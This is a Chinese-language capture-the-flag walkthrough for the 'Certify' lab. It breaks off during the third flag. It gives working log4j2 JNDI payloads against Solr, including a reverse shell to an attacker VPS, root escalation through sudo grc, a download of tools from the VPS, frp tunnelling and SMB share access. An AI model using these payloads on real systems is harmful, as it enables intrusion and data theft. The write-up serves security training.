---
title: 春秋云镜Certify-WP
date: 2025-03-11 17:00:39
tags:
---

<meta name="referrer" content="no-referrer">

#  [Certify](https://www.kinsomnia.cn/index.php/2024/04/08/春秋云境-certify/) 

## 一、flag01

先用`fscan`扫描一下

![](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/1.png)

扫出来了一个 `Solr` 服务

```
Solr 是开源的，基于 Lucene Java 的搜索服务器。
易于加入到 Web 应用程序中，会生成基于HTTP 的管理界面。
后台管理界面Dashboard仪表盘中，可查看当前Solr的版本信息。
```

访问这个地址，发现是 `solr8.11.0` 版本，搭载了 `lo4j2` 组件，`solr8.11.0` 刚好也是能触发 `log4j2` 漏洞的[最新版本](https://www.cybersecurity-help.cz/vdb/SB2021121345)

![2](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/2.png)

用 `dnslog` 探测一下是否存在 `log4j2` 漏洞

```
http://121.89.212.114:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.hsd11b.dnslog.cn} 
#hsd11b.dnslog.cn是DNSLog Get SubDomain的url
```

`dnslog`回显

![3](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/3.png)

在 `vps` 上开启 `1389` 和 `3456` 端口，然后跑一下 [`JNDIExploit`](https://github.com/WhiteHSBG/JNDIExploit/releases/tag/v1.4)（如果跑不起来，多半是 `java` 版本的问题，换成 `1.8` 就好了）

```
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i VPS_IP
```

![4](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/4.png)

然后访问

```
http://靶场地址:8983/solr/admin/cores?action=${jndi:ldap://VPS_IP:1389/Basic/ReverseShell/VPS_IP/22222}
```



![5](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/6.png)

同时在`VPS`上开启监听

成功反弹`Shell`

![6](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/5.png)

这里拿下的权限不是 `root`，肯定是要提权的，先看看 `suid` 权限有没有可用的

先用`sudo -l`，一般来说 `sudo -l` 能用，基本就能靠里面的东西提权

```
sudo -l
```

![7](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/7.png)

`grc` 就是一个显示高亮的命令，后面跟着要执行的原始命令，这里任何用户都可以以 `root` 权限运行 [`grc`](https://gtfobins.github.io/gtfobins/grc/)，那就等于给了我们 `root` 权限

```
sudo grc --help
```

![8](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/8.png)

```
sudo grc --pty whoami
```

![9](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/9.png)

这里可以看到我们可以用`grc`来获得`root`的权限

然后我们查找一下`flag`

```
sudo grc --pty find / -name flag*
```

![10](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/10.png)

发现`flag01.txt`，输出一下

```
sudo grc --pty cat /root/flag/flag01.txt
```

![](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/flag01.png)

## 二、flag02

信息收集

```
ifconfig
```

![11](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/11.png)

先在`VPS`上架设`http`服务，`wget`下载`frpc`和`fscan`

```
python3 -m http.server 8001
```

![](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/22.png)

这里`wget`下载时注意也要用`grc`提权

```
sudo grc --pty wget http://113.45.36.119:8001/frpc.ini
sudo grc --pty wget http://113.45.36.119:8001/frpc
sudo grc --pty wget http://113.45.36.119:8001/fscan
```

![](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/14.png)

![15](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/15.png)

接着用`fscan`扫描内网

![13](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/13.png)

```
172.22.9.7 DC 
172.22.9.26 域内机器
172.22.9.19 已拿下
172.22.9.47 fileserver
```

内网穿透

先在`VPS`上启动服务端服务

```
./frps -c frps.ini
```

`frps.ini`配置

```

```

![16](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/16.png)

然后运行客户端

```
./frpc -c frpc.ini
```

`frpc.ini`配置

```

```

![17](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/17.png)

成功穿透后配置`proxychains4.conf`

```
vim /etc/proxychains4.conf
```

使用 `smbclient` 连接共享

```
proxychains smbclient \\\\172.22.9.47\\fileshare
```

![18](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/18.png)

`ls`查看一下，在`secret`下发现`flag02.txt`

![19](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/19.png)

在`smbclient`下是不能直接看的，要用`get`下载下来

```
get flag02.txt
```

需要注意在哪一个目录下运行`smbclient`，`smb`就会把下载的文件放到该目录下

![](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/flag02.txt.png)

这里还提示我们 `SPN`，之后应该会用到

## 三、flag03

回到上一层文件夹下载目录下的 `personnel.db`

![](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/23.png)

下载下来之后发现有两张表的内容是有用的，其中一张表里面有密码

![20](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/20.png)

另一张表里面是用户名

![21](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/21.png)













